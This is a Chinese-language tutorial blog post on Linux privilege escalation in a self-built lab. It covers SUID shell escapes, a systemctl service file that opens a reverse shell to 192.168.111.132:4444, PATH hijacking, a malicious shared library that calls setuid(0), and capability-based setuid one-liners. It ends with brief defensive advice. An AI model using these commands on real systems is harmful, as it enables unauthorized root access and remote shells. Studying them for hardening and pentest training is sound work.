---
title: "suid相关提权思路"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# suid相关提权思路

SetUID是linux的一种安全机制，允许用户在执行特定文件时暂时将其有效用户ID改为该文件**所有者**的用户ID。这样，即使当前用户没有执行该文件的权限，也可以执行该文件。

使用如下命令为目标文件添加suid权限：

~~~shell
chmod u+s /etc/passwd
~~~

**注意：**

* 只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义
* 命令执行者要对该程序文件拥有执行(x)权限才能使用
* SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效

### suid配置不当提权

如果suid配置不当，可能会导致权限提升，原理也是利用被赋予suid权限的文件命令执行，获取一个新的高权限的shell

我们以find命令为例配置一个实验场景（`chmod u+s /usr/bin/find`即可）：

* 我们现在的shell是普通用户yuy0ung的身份，尝试利用suid来提权：

  ![image-20240717172808397](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240717172809230-494087304.png)

* 首先查找所有配置了suid权限的文件：

  ~~~shell
  find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
  ~~~

  这里选项参数是这样设置的：

  - -type f: 只查找普通文件，排除目录等其他类型的文件

  - -exec ls -la {} 2>/dev/null ;: 对查找到的文件执行 ls -la 命令，2>/dev/null 表示将标准错误输出重定向到 /dev/null，以避免显示不必要的错误信息

  - -perm匹配权限：

    ~~~shell
    4000 2000 1000分别表示SUID SGID SBIT
    1.普通文件，文件的权限一般三位，777最高文件权限
    -perm -0777搜索的就是最高权限的文件rwxrwxrwx
    -perm +0777搜索的只要包含rwxrwxrwx任意一个的文件
    2.特殊文件，包含权限位置四位，7000为最高，即–s–s–t，同样的方法
    -perm -7000搜索的就是最高权限的文件–s–s–t
    -perm +7000搜索的只要包含–s–s–t任意一个的文件，–s — —（4000）、— –s —（2000）、— — –t（1000）等
    ~~~


  ![image-20240717173214585](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240717173215355-197029552.png)

* 根据查找结果可以看到`/usr/bin/find`被赋予了suid权限，而他的所有者为root，我们可以这样获取一个root权限的shell：

  ~~~shell
  find /etc/passwd -exec /bin/bash -p \;
  ~~~

  ![image-20240717174407310](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240717174407805-64360826.png)

  如此，成功提升到root权限

同理，不只find命令，有很多赋予suid权限的文件可以达到权限提升的效果(实际上也和rbash逃逸、sudo提权那些获取shell的命令相似)，这里列举几个：

| suid文件      | 提权命令                                |
| ------------- | --------------------------------------- |
| /usr/bin/bash | bash -p                                 |
| /usr/bin/csh  | csh -b                                  |
| /usr/bin/sh   | sh -p                                   |
| /usr/bin/ksh  | ksh -p                                  |
| /usr/bin/zsh  | zsh                                     |
| /usr/bin/find | find  /etc/passwd -exec /bin/bash -p \; |
| /usr/bin/awk  | awk 'BEGIN {system("/bin/bash")}'       |
| /usr/bin/man  | !/bin/bash                              |
| /usr/bin/more | !/bin/bash                              |

**利用命令均可在这个网站上查询**：[GTFOBins](https://gtfobins.github.io/)，这里不再赘述

### suid systemctl提权

systemctl是用于管理 Systemd 的命令行工具。当systemctl被配置 SUID 权限时，可以通过创建.service 文件实现权限提升（感觉sudo也是同理）

接下来通过实际操作演示步骤：

#### 环境配置

以root身份给systemctl配置suid权限：

~~~shell
sudo chmod u+s /bin/systemctl
~~~

![image-20240731153854829](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731153855077-2031325291.png)

再切换到yuy0ung进行利用

#### 漏洞利用

* 信息收集可知systemctl拥有suid权限

* 首先在/tmp目录编写一个 service unit（服务单元）文件用来被systemctl加载，这里将反弹shell代码写入exp.service：

  ~~~shell
  echo '[Service]
  Type=oneshot
  ExecStart=/bin/bash -c "/bin/bash -i > /dev/tcp/192.168.111.132/4444 0>&1 2<&1"
  [Install]
  WantedBy=multi-user.target' > exp.service
  ~~~

* 将单元文件复制到`/dev/shm`目录并使用systemctl加载：

  >默认情况下，`systemctl` 命令是加载文档中所写的 `/usr/lib/systemd/system/` 文件夹（此文件夹包含系统预定义的单元文件）和 `/etc/systemd/system/` 文件夹（此文件夹包含用户定义的单元文件）。不过通常测试人员获取的低权限账号是不具备这两个目录写入权限的。由于临时目录 `/tmp` 中的内容可能会被随时更改或删除，所以 `systemctl` 也无法加载 `/tmp` 目录中的文件。那么解决方法是将服务单元文件放置在 `/dev/shm` 文件夹（Linux 中的共享内存文件系统，用于存放临时文件）下，该文件夹下的单元文件可以被 `systemctl` 正常加载且任意用户可写

  ~~~shell
  cp /tmp/exp.service /dev/shm/exp.service
  ~~~

  ![image-20240731160203423](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731160203804-50863136.png)

* 攻击机监听：

  ![image-20240731160255438](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731160255413-1760738442.png)

* 使用systemctl加载服务单元文件：

  ~~~shell
  systemctl link /dev/shm/exp.service	# 建立链接
  systemctl enable --now /dev/shm/exp.service	#启动服务 
  ~~~

  ![image-20240731160709052](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731160709315-150005784.png)

  加载后会反弹shell

  ![image-20240731160818737](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731160819335-57629860.png)

  成功获取root权限

### $PATH变量劫持提权

$PATH 是Linux系统中的一个环境变量，与windows下的 Path 环境变量的概念基本相同
它的主要作用是当用户执行命令时，系统会按照$PATH变量中的路径设置依次去寻找命令文件位置，**执行最先找到的命令文件**，可以根据这种特性，通过$PATH环境变量劫持来进行权限提升

接下来通过实际操作演示步骤：

#### 环境配置

* 先在`/home/yuy0ung/shell`目录下编辑一个demo.c：

  ![image-20240731172652659](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731172652584-117833834.png)

  ![image-20240731172505138](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731172505646-380048727.png)

* gcc编译为shell文件：

  ~~~shell
  gcc demo.c -o shell
  ~~~

  ![image-20240731172823832](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731172823742-1908824006.png)

* 赋予suid权限：

  ![image-20240731173034873](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731173035276-243365028.png)

* 完毕，切换到yuy0ung准备利用

#### 漏洞利用

* 首先通过信息收集发现`/home/yuy0ung/shell/shell`拥有suid权限

* 执行一下看看是干什么的：

  ![image-20240731174036238](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731174036160-931799264.png)

  这不和ps差不多嘛

* 用xxd看看内容是不是有ps：

  ~~~shell
  xxd /home/yuy0ung/shell/shell | grep "ps";
  ~~~

  ![image-20240731174101808](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731174101995-1760849446.png)

  还真是

所以程序拥有suid权限，调用了ps命令，那么可以尝试环境变量劫持提权

这里有三种思路：

* 思路1：在/tmp目录创建一个ps文件，内容是打开一个bashshell

  ~~~shell
  echo "/bin/bash" > /tmp/ps && chmod +x /tmp/ps
  ~~~

* 思路2：将`/bin/bash`文件复制为`/tmp/ps`文件

  ~~~shell
  cp /bin/bash /tmp/ps
  ~~~

* 思路3：将`/bin/bash`软链接到`/tmp/ps`文件

  ~~~shell
  ln -s /bin/bash /tmp/ps
  ~~~

这里我使用第一种思路：

![image-20240731175013495](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731175013725-1335686028.png)

接下来是最关键的一步，将/tmp加入$PATH环境变量：

~~~shell
export PATH=/tmp:$PATH
~~~

![image-20240731175156720](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731175156865-520774972.png)

可以看见/tmp在$PATH变量最前面，那么程序执行ps时会优先在/tmp目录寻找，就会执行`/tmp/ps`，获取一个root权限的BashShell：

![image-20240731175435898](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240731175435801-1095065561.png)

提权成功

### so共享对象库注入提权

linux的程序库是一种特殊的程序文件，用于将一些常用代码、函数、变量打包，方便多个程序共享调用，而程序库分为两种：

* 静态函数库：

  在程序编译时，直接将库中的代码链接到目标程序中，在linux中通常使用.a或.lib扩展名

* 共享函数库：

  即我们熟知的.so文件，包含编译好的代码、文件，可在程序运行时加载和卸载

一些开发人员会在程序中手动指定动态加载库的位置比如：`dlopen("so文件路径",RTLD_LAZY)`，而如果程序被配置了SUID权限，且在执行时没有找到应该要加载的动态函数库，那么我们可以伪造一个同名后门库文件，让程序加载此文件实现提权，原理类似windows的DLL劫持

#### 环境配置

以root身份进行配置

创建一个文件`/script/demo.c`：

~~~c
#include <stdio.h>  
#include <dlfcn.h>  

int main() {  
    // 输出 hello  
    printf("hello\n");  

    // 加载共享库  
    void* handle = dlopen("/tmp/demo.so", RTLD_LAZY);  
    if (!handle) {  
        fprintf(stderr, "Cannot load library: %s\n", dlerror());  
        return 1;  
    }  

    // 在这里可以使用 dlsym 来获取库中的函数  

    // 关闭共享库  
    dlclose(handle);  
    return 0;  
}
~~~

然后gcc编译为脚本文件：

~~~shell
gcc demo.c -o demo
~~~

赋予SUID权限：

~~~
chmod 4755 demo
~~~

![image-20240918110300195](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240918110318449-2091203180.png)

切换到普通用户yuy0ung，接下来进行利用

#### 漏洞利用

信息搜集发现SUID权限文件：

![image-20240918111713653](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240918111716901-1933871054.png)

这是一个编译后的脚本文件，执行看看：

![image-20240919085054661](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240919085057063-432343489.png)

发现脚本尝试加载库文件`/tmp/demo.so`但是库文件不存在

因为库文件的目录是`/tmp`，任何用户都可读写，因此考虑制作一个同名so文件来getshell

编写一个`/tmp/demo.c`：

~~~c
#include<stdio.h>
#include<stdlib.h>
void _init(){
        setresuid(0,0,0);
        system("/bin/bash -p");
}
~~~

![image-20240919085605980](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240919085607170-502791537.png)

gcc编译为shell.so，不使用默认的启动文件:

~~~shell
gcc -shared -fPIC -o demo.so demo.c -nostartfiles
~~~

![image-20240919090035020](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240919090036162-161582723.png)

接下来再执行一次`/script/demo`，这里会加载我们构造的so文件，实现提权：

![image-20240919090443205](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240919090444451-1046704930.png)

### Capabilities机制提权

从linux内核2.2开始引入了capabilities机制，这是一种权限管理机制，用于确定一个程序或用户是否具有执行某项特定操作的权限

该机制相比suid更安全，可以更精细地控制权限，使程序只能获得它所需的最小权限

使用该机制时，系统会使用一个列表来存储程序地capability sets（能力集），程序在请求访问某个系统资源时，系统会检查该程序的capability sets，并根据其中的capabilities来决定是否允许访问

这里要提的capibilty是CAP_SETUID，效果即setuid，所以可能存在权限的风险，接下来进行场景复现

#### 环境配置

首先以root身份进行配置

首先找到python文件的位置：

~~~shell
which python3
~~~

![image-20240919191831614](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240919191834116-1602129008.png)

然后检查是否是符号链接：

~~~shell
readlink -f /usr/bin/python3
~~~

![image-20240919192121409](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240919192123114-263162513.png)

找到后，设置cap_setuid：

~~~shell
setcap cap_setuid=eip /usr/bin/python3.10
~~~

![image-20240919192151590](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240919192153276-1358870743.png)

切换到yuy0ung

#### 漏洞利用

信息收集发现python3.10有cap_setuid能力：

~~~cmd
getcap -r / 2>/dev/null
~~~

![image-20240919194643985](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240919194646580-1007803539.png)

另外，这里python3的cap_setuid标记了e（effective）和p（permitted），即有效和允许，即表示该程序具有修改进程的有效用户ID的权限，所以构造python3命令，调用setuid将进程的用户ID设置为0，并执行`/bin/bash`获取root权限的BashShell：

~~~shell
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
~~~

![image-20240919201632879](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240919201635337-1386662673.png)

同理，有很多文件都可以实现这种提权：

| 文件 | 命令                                                         |
| ---- | ------------------------------------------------------------ |
| gbd  | gbd -nx -ex 'python import os;os.setuid(0)' -ex '!sh' -ex quit |
| node | node -e 'process.setuid(0);child_process.spawn("/bin/bash",{stdio:[0,1,2]})' |
| php  | php -r "posix_setuid(0);system('/bin/bash');"                |
| ruby | ruby -e 'Process::Sys.setuid(0);exec "/bin/bash"'            |
| perl | perl -e 'use POSIX qw(setuid); POSIX::setuid(0);exec "/bin/bash";' |
| vim  | vim -c ':py import os;os.setuid(0);os.execl("/bin/bash","sh","-c","reset;exec sh")' |

### 如何防御？

针对上面提到的这些提权手段，可以进行如下防御：

* 定期审查系统中suid权限文件的完整性，确保只有授权了的用户组可以执行
* 限制系统中配置suid权限文件的数量，只给必要程序授权
* 正确配置环境变量
* 定期审查日志，做好应急响应
* 正确配置程序与文件
